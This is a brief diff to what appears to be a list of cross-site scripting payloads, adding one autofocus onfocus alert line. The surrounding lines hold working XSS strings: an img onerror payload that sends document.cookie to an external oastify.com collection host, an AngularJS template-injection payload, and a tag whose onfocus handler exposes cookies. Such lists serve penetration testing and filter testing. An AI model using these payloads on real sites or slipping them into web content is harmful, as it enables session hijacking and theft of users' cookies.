@@ -4,3 +4,5 @@
 <img+src%3dx+onerror%3dthis.src%3d'http://1qsd6gspmvyvulcfpv5gfl7vmmsdg84x.oastify.com%3fc%3d'%2bdocument.cookie>
 {{$on.constructor('alert(1)')()}}
 <kebby onfocus=”alert(document.cookie)” id=”x” tabindex=”1”>
+<input autofocus onfocus=alert(1)>
+
